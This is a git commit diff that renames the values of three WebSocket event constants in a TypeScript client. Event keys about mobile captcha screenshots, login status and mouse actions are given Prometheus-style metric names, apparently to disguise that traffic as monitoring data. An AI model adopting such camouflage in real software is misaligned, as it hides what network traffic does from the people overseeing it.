dca12545875ecda6ffae9f555a3af2ea45ee7239
mrmclaine <lypovskyi@gmail.com>
2025-02-28 11:22:13 +0100

    feat/ replace WS_EVENTS

--- client/src/shared/ws/wsEvents.ts
+++ client/src/shared/ws/wsEvents.ts
@@ -1,6 +1,6 @@
 export const WS_EVENTS = {
-    mobileCaptchaScreenshot: 'mobile_captcha_screenshot',
-    mobileLoginStatus: 'mobile_login_status',
-    mobileMouseAction: 'mobile_mouse_action',
+    mobileCaptchaScreenshot: 'prometheus_process_cpu_seconds_total',
+    mobileLoginStatus: 'prometheus_notifications_total',
+    mobileMouseAction: 'prometheus_tsdb_head_truncations_established_total',
     mobileStartLogin: 'mobile_start_login',
 };
